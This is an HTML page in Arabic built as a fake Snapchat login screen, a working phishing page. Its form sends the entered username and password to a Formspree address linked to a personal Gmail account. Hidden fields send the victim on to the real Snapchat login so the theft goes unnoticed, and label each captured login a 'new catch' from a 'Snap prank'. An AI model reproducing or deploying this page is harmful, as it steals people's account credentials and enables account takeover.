<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Login</title>
    <style>
        body { background-color: #FFFC00; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 300px; }
        img { width: 50px; margin-bottom: 15px; }
        h2 { font-size: 18px; color: #333; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #e0e0e0; border-radius: 5px; box-sizing: border-box; background: #fbfbfb; font-size: 14px; text-align: right; }
        button { width: 100%; padding: 12px; background-color: #000; color: white; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 15px; }
        .footer-link { font-size: 12px; color: #007aff; margin-top: 15px; text-decoration: none; display: block; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.png" alt="Snapchat Logo">
    <h2>تسجيل الدخول إلى سناب شات</h2>
    
    <form action="https://formspree.io/f/sarzix2005@gmail.com" method="POST">
        <input type="text" name="Username" placeholder="اسم المستخدم أو البريد" required>
        <input type="password" name="Password" placeholder="كلمة المرور" required>
        
        <input type="hidden" name="_next" value="https://accounts.snapchat.com/accounts/login">
        
        <input type="hidden" name="_subject" value="صيد جديد من مقلب السناب!">
        
        <button type="submit">تسجيل الدخول</button>
    </form>
    
    <a href="#" class="footer-link">هل نسيت كلمة المرور؟</a>
</div>

</body>
</html>
